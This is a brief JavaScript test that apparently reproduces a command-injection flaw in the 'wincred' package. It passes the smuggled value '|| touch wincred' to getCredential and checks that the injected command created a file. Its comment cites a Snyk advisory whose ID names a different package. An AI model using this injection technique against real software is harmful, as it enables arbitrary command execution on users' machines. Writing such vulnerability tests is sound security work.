//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078537
test("Command Injection in wincred", () => {
  const wincred = require("wincred");
  const fs = require("fs");
  const path = "./wincred";
  const sleep = require("sleep");

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  wincred.getCredential("|| touch wincred");

  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, () => {}); //deleting the file after creation
});
